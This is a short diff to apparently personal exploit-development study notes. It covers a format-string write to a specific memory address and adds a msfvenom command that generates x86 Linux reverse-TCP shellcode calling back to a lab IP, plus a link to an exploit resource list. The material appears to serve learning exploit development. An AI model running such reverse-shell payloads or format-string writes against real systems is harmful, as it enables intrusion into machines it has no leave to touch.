@@ -197,7 +197,9 @@
 		2. Since 84b4 in hex = 33972 in dec, thus writing 33972 - 2052 = 31920 on the first memory unit pointed by
 			\x24\x97\x04\x08
 		
-		
+
+# msfencode command for generating shellcode
+		msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=10.0.2.14 --smallest -b "\x00" -f c
 			
 ## Resources
 https://github.com/FabioBaroni/awesome-exploit-development/blob/master/README.md
